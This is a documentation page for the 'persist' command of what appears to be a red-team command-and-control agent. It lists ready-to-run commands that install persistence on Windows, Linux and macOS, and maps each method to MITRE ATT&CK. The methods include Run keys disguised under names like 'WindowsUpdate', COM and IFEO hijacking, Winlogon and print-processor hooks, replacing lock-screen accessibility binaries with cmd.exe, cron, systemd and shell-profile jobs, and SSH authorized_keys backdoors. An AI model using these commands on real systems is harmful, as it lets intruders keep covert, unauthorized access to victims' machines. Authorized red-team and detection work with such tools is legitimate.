+++
title = "persist"
chapter = false
weight = 125
hidden = false
+++

## Summary

Install or remove persistence mechanisms. Cross-platform: Windows (registry, startup-folder, com-hijack, screensaver, IFEO, winlogon, print-processor, accessibility), Linux (crontab, systemd, shell-profile, ssh-key), macOS (launchagent). All methods support install, remove, and list actions.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| method | choose_one | Yes | registry | Persistence method: `registry`, `startup-folder`, `com-hijack`, `screensaver`, `ifeo`, `winlogon`, `print-processor`, `accessibility`, or `list` |
| action | choose_one | No | install | `install` to add persistence, `remove` to delete it |
| name | string | No* | - | Registry value name or startup folder filename (*required for registry, defaults to exe name for startup) |
| path | string | No | Current agent | Path to executable. Defaults to the running agent binary. |
| hive | choose_one | No | HKCU | `HKCU` (current user, no admin needed) or `HKLM` (all users, admin required). Used by `registry` method. |
| clsid | string | No | {42aedc87-...} | COM object CLSID to hijack. Default is MruPidlList (loaded by explorer.exe at logon). Used by `com-hijack` method. |
| timeout | string | No | 60 | Idle timeout in seconds before screensaver triggers. Used by `screensaver` method. |

## Usage

### Registry Run Key Persistence

Install a Run key for the current agent (HKCU, no admin):
```
persist -method registry -action install -name "WindowsUpdate"
```

Install a Run key with custom path (HKLM, requires admin):
```
persist -method registry -action install -name "SecurityService" -path "C:\Windows\Temp\svc.exe" -hive HKLM
```

Remove a Run key:
```
persist -method registry -action remove -name "WindowsUpdate" -hive HKCU
```

### Startup Folder Persistence

Copy agent to user's Startup folder:
```
persist -method startup-folder -action install -name "updater.exe"
```

Remove from Startup folder:
```
persist -method startup-folder -action remove -name "updater.exe"
```

### COM Hijacking Persistence

Hijack a COM object CLSID so that when explorer.exe (or another application) loads the COM object, your DLL/EXE runs instead. Uses HKCU InprocServer32 override — no admin required.

Install with default CLSID (MruPidlList, loaded by explorer.exe at user logon):
```
persist -method com-hijack -action install -path "C:\Users\user\payload.dll"
```

Install with a specific CLSID:
```
persist -method com-hijack -action install -path "C:\Users\user\payload.dll" -clsid "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
```

Remove COM hijack:
```
persist -method com-hijack -action remove -clsid "{42aedc87-2188-41fd-b9a3-0c966feabec1}"
```

### Screensaver Hijacking Persistence

Set the Windows screensaver to your payload. When the user is idle for the configured timeout, winlogon.exe launches the payload. Uses HKCU registry — no admin required.

Install screensaver persistence (triggers after 5 minutes idle):
```
persist -method screensaver -action install -path "C:\Users\user\payload.exe" -timeout 300
```

Install with default timeout (60 seconds):
```
persist -method screensaver -action install
```

Remove screensaver persistence:
```
persist -method screensaver -action remove
```

### IFEO Debugger Persistence

Set Image File Execution Options (IFEO) to hijack a target executable. When the target is launched, your payload runs instead with the target path as an argument. Commonly used with lock screen accessibility tools (sethc, utilman, osk). Requires admin.

Install IFEO persistence for Sticky Keys (5x Shift at lock screen):
```
persist -method ifeo -action install -name sethc.exe -path "C:\Windows\Temp\payload.exe"
```

Install for Ease of Access button:
```
persist -method ifeo -action install -name utilman.exe
```

Remove IFEO persistence:
```
persist -method ifeo -action remove -name sethc.exe
```

### Winlogon Helper Persistence

Modify the Winlogon Shell or Userinit registry values to run your payload alongside the legitimate binary at every user logon. Requires admin (HKLM).

Install via Userinit (default, more reliable):
```
persist -method winlogon -action install -name userinit -path "C:\Windows\Temp\svc.exe"
```

Install via Shell (runs alongside explorer.exe):
```
persist -method winlogon -action install -name shell -path "C:\Windows\Temp\svc.exe"
```

Remove (must specify path to strip):
```
persist -method winlogon -action remove -name userinit -path "C:\Windows\Temp\svc.exe"
```

### Print Processor Persistence

Register a DLL as a Windows print processor. The DLL is loaded by spoolsv.exe when the Print Spooler service starts. Requires admin.

Install:
```
persist -method print-processor -action install -name "FawkesProc" -path "C:\Users\user\payload.dll"
```

Remove:
```
persist -method print-processor -action remove -name "FawkesProc" -path "payload.dll"
```

### Accessibility Features Persistence

Replace Windows accessibility binaries (sethc.exe, utilman.exe, etc.) with a payload. These can be triggered from the Windows lock screen before login. Requires admin/SYSTEM.

Replace Sticky Keys (5x Shift at lock screen) with cmd.exe:
```
persist -method accessibility -action install -name sethc.exe
```

Replace Ease of Access button with custom payload:
```
persist -method accessibility -action install -name utilman.exe -path "C:\Windows\Temp\payload.exe"
```

Restore original binary from backup:
```
persist -method accessibility -action remove -name sethc.exe
```

{{% notice info %}}Supported targets: sethc.exe (Sticky Keys), utilman.exe (Ease of Access), osk.exe (On-Screen Keyboard), narrator.exe (Narrator), magnify.exe (Magnifier).{{% /notice %}}

### List Existing Persistence

Enumerate all known persistence entries — registry Run keys (HKCU + HKLM), startup folder, COM hijack entries, IFEO debugger entries, Winlogon helper values, print processors, accessibility binary integrity, and screensaver settings:
```
persist -method list
```

### Example Output (list)
```
=== Persistence Entries ===

--- HKCU\Software\Microsoft\Windows\CurrentVersion\Run ---
  OneDrive = "C:\Users\setup\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background

--- HKLM\Software\Microsoft\Windows\CurrentVersion\Run ---
  SecurityHealth = %windir%\system32\SecurityHealthSystray.exe

--- Startup Folder: C:\Users\setup\AppData\Roaming\...\Startup ---
  desktop.ini (174 bytes)

--- COM Hijacking (HKCU InprocServer32 overrides) ---
  {42aedc87-2188-41fd-b9a3-0c966feabec1}  MruPidlList (explorer.exe) = C:\Users\setup\payload.dll

--- Screensaver (HKCU\Control Panel\Desktop) ---
  SCRNSAVE.EXE    = C:\Users\setup\payload.exe
  ScreenSaveActive = 1 (Yes)
  ScreenSaveTimeout = 300 seconds
```

## Linux Methods

### Crontab Persistence

Install a cron job (default: every 5 minutes):
```
persist -method crontab -action install -path "/tmp/agent" -name "backup"
persist -method crontab -action install -path "/tmp/agent" -schedule "0 */4 * * *" -name "updater"
```

Remove by marker name:
```
persist -method crontab -action remove -name "backup"
```

### Systemd Service Persistence

Create a systemd user service (or system service if root):
```
persist -method systemd -action install -path "/tmp/agent" -name "user-helper"
```

Remove:
```
persist -method systemd -action remove -name "user-helper"
```

### Shell Profile Persistence

Append to .bashrc/.zshrc with marker comments:
```
persist -method shell-profile -action install -path "/tmp/agent" -name "updater"
```

Remove (cleans all profile files):
```
persist -method shell-profile -action remove -name "updater"
```

### SSH Key Persistence

Add an SSH public key to authorized_keys:
```
persist -method ssh-key -action install -path "ssh-rsa AAAA..." -name "backup-key"
persist -method ssh-key -action install -path "ssh-rsa AAAA..." -user root -name "admin-key"
```

Remove:
```
persist -method ssh-key -action remove -name "backup-key"
```

### List All (Linux)

```
persist -method list
```

## MITRE ATT&CK Mapping

- T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- T1547.009 — Boot or Logon Autostart Execution: Shortcut Modification
- T1546.015 — Event Triggered Execution: Component Object Model Hijacking
- T1546.002 — Event Triggered Execution: Screensaver
- T1546.012 — Event Triggered Execution: Image File Execution Options Injection
- T1053.003 — Scheduled Task/Job: Cron
- T1543.002 — Create or Modify System Process: Systemd Service
- T1546.004 — Event Triggered Execution: Unix Shell Configuration Modification
- T1098.004 — Account Manipulation: SSH Authorized Keys
- T1543.004 — Create or Modify System Process: Launch Agent/Daemon
- T1547.004 — Boot or Logon Autostart Execution: Winlogon Helper DLL
- T1547.012 — Boot or Logon Autostart Execution: Print Processors
- T1546.008 — Event Triggered Execution: Accessibility Features
